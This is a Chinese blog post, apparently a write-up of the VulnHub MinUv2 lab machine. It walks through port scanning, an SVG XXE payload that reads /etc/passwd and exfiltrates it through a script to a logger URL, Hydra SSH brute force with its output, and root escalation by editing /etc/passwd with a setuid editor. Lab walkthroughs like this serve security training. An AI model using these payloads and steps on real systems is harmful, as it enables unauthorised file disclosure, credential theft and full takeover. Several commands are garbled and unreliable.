---
layout: post
title: "「渗透」SVG的神秘力量：minUv2"
date: 2019-09-01
author: Bin4xin
categories:
    - blog
    - Web
    - 漏洞复现
    - 渗透
    - vulnhub
permalink: /blog/2019/minUv2/
---

# 序言
hello,各位。最近闲来无事，工作之余偷偷用公司电脑测试入侵了一个linux靶机，遂记录下。（手动狗头）
这个靶机本身难度适中，复现了svg的代码执行漏洞且要求对linux的系统命令较为熟悉；svg大体来说是一种图像文件格式，基于XML，由W3C联盟进行开发的，支持网页打开，编辑方便等。可以自行深入搜索~各位大佬见笑。
## 一、靶机简介
minUv2下载地址:<br>
<a href="https://download.vulnhub.com/minu/MinUv2.ova.7z">Download (Mirror)</a>
<br>
<a href="https://download.vulnhub.com/minu/MinUv2.ova.7z.torrent">Download (Torrent)</a>
<br> 
## 二、实战
江湖规矩，神器开路：首先先用`Nmap`扫描确定靶机地址。发现靶机ip。
这里靶机只支持vbox，所以得桥接通信，打码请谅解~<br>
![](https://p2.ssl.qhimg.com/t0167faf934cb9977ca.png)<br>
确定ip直接端口扫描~
![](https://p4.ssl.qhimg.com/t011687f39e33bbe3e4.png)
发现只开放了两个端口：`22、3306`端口。22端口暂时先放着不管，咱们看看3306端口。
是一个web页面，emmmm.主角登场，svg图像~
![](https://p0.ssl.qhimg.com/t019035849ce7a48ccf.png)
## 三、发现漏洞
小弟赶紧dirb扫描一波，果然有发现。<br>
```applescript
#扫描3306端口下的html后缀的文件
dirb http://$_ip:port -X .html
--------------
+ http://$_ip:port/upload.html (CODE:200|SIZE:908)
--------------
DOWNLOADED: 4612 - FOUND: 1
```
发现了上传网页，且只能上传svg、img文件，又惊又喜。exp搜索一哈找到poc，验证一下漏洞的存在。poc代码如下：
```applescript
#poc上传上去页面回显
#<!DOCTYPE svg [
<!ELEMENT svg ANY >
<!ENTITY xxe SYSTEM "/etc/passwd">
]>
<svg version="1.0" xmlns="http://www.w3.org/2000/svg" width="19000px" xmlns:xlink="http://www.w3.org/1999/xlink" >
<text x="-1000" y="-1000" >&xxe;</text>
<circle cx="50" cy="50" r="40" stroke="black" stroke-width="3" 		fill="red" />
<script>
var logger = "http://localhost/?file=" +
encodeURIComponent(document.getElementsByTagName("text")	[0].innerHTML);
document.createElementNS('http://www.w3.org/2000/svg','image').setAttributeNS('http://www.w3.org/1999/xlink','href', logger);
</script></svg>
```
<br>
果然有`xxe`漏洞，但是验证了漏洞不能让我们有实际的渗透进展，只能对一些文件内容进行查看，无法得到shell，要怎么办呢？

![](https://p1.ssl.qhimg.com/t0163eb735e597071e2.png)

## 四、get shell
就在小弟愁眉苦脸的时候，忽然看到最后一行用户名的进程是/bin/ash，想到bash shell会有历史纪录，赶紧重新上传一个poc验证想法。回显内容：<br>
```applescript
"./ash.history"获取~
Useradd –D bossdonttrackme –p superultrapass3
```
根据所得的内容生成用户字典（passwd回显的用户名），密码字典。用Hydra跑一下。
```applescript
##hydra -L /root/Documents/test/minu/use.txt -P /root/Documents/test/minu/passwd.txt ssh://$_ip
Hydra v8.9.1 (c) 2019 by van Hauser/THC - Please do not use in military or 
secret service organizations, or for illegal purposes.
[WARNING] Many SSH configurations limit the number of parallel tasks, it is
recommended to reduce the tasks: use -t 4	[DATA] max 16 tasks per 1 server, overall 16 tasks, 30 login tries (l:30/p:1), ~2 tries per task
[DATA] attacking ssh://$_ip:22/
[22][ssh] host: $_ip ** login: employee password: superultrapass3**
1 of 1 target successfully completed, 1 valid password found
##跑出来账号密码employee：uperultrapass3，ssh连上去。
##连接上去查看一下基本信息 
ssh employee@ip
whoami
id | find -perm -4000 2>/dev/null
```
![](https://p5.ssl.qhimg.com/t013dbd6663c5c9720e.png)
## 五、提权
发现`micro`和`bbsuid`不需要高权限，运行一下，发现micro是一个`文本编辑工具器`。接下来就简单了。
```applescript
#生成一份hash值，替换掉passwd的用户密码，这样密码就已知了。
#用micro编辑器打开passwd文件，替换root密码保存即可
passwd -1 -salty root admin123(随意)
cat /etc/passwd |/usr/bin/micro
```
![](https://p5.ssl.qhimg.com/t0198aaa755e6394b0f.png)
这样我们就已知root密码了，直接切换用户
```applescript
minuv2:~$ su root
Password: 
minuv2:/home/employee# whoami
root
minuv2:/home/employee#
```
![](https://p2.ssl.qhimg.com/t01aefe59b403bdcc5c.png)
获得flag~感谢各位

